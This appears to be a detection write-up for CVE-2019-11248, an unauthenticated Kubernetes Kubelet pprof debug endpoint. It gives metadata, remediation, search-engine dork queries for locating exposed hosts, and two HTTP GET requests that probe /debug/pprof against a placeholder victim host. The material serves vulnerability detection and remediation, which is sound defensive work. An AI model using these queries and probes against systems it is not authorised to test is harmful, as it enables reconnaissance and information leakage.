---
layout: post
cve_id: CVE-2019-11248
title: Debug Endpoint pprof - Exposure Detection
pcap: true
pcap_path: /pcaps/2019/CVE-2019-11248.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-11248.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0xceeb,ritikchaddha
severity: high
impact: 'An attacker can exploit this vulnerability to gather sensitive information,
  potentially leading to further attacks.

  '
remediation: 'Disable or restrict access to the Debug Endpoint pprof to prevent unauthorized
  access.

  '
reference:
- https://medium.com/bugbountywriteup/my-first-bug-bounty-21d3203ffdb0
- http://mmcloughlin.com/posts/your-pprof-is-showing
- https://github.com/kubernetes/kubernetes/issues/81023
- https://groups.google.com/d/msg/kubernetes-security-announce/pKELclHIov8/BEDtRELACQAJ
- https://nvd.nist.gov/vuln/detail/CVE-2019-11248
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L
  cvss-score: 8.2
  cve-id: CVE-2019-11248
  cwe-id: CWE-862,CWE-419
  epss-score: 0.91212
  epss-percentile: 0.99628
  cpe: cpe:2.3:a:kubernetes:kubernetes:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: kubernetes
  product: kubernetes
  shodan-query: http.title:"kubernetes web view"
  fofa-query:
  - title="kubernetes web view"
  - app="kubernetes-enterprise-manager"
  google-query: intitle:"kubernetes web view"
tags:
- cve2019
- cve
- debug
- kubernetes
- kubelet
- devops
- unauth
- disclosure
- vkev
- vuln
---

## üîç Vulnerability Description
The debugging endpoint /debug/pprof is exposed over the unauthenticated Kubelet healthz port. This debugging endpoint can potentially leak sensitive information such as internal Kubelet memory addresses and configuration, or for limited denial of service. Versions prior to 1.15.0, 1.14.4, 1.13.8, and 1.12.10 are affected. The issue is of medium severity, but not exposed by the default configuration.


## üåê HTTP Request
```nohighlight
GET /debug/pprof/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /debug/pprof/goroutine?debug=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

